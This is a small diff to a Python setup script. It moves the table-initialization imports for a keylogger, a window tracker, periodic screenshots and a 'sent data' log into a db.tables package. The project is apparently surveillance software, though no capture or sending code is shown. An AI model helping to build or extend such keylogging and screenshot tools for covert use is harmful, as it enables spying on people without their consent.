@@ -1,8 +1,8 @@
 print("Initializing tables...\n")
-import KeyloggerDB.initKeylogger
-import WindowTrackerDB.InitWindowTrackerTable
-import PeriodicScreenshotsDB.InitPeriodScreenshots
-import SentDataDB.InitSentData
+import db.tables.initKeylogger
+import db.tables.InitWindowTrackerTable
+import db.tables.InitPeriodScreenshots
+import db.tables.InitSentData
 print("\nTables initialized successfully")
 
 
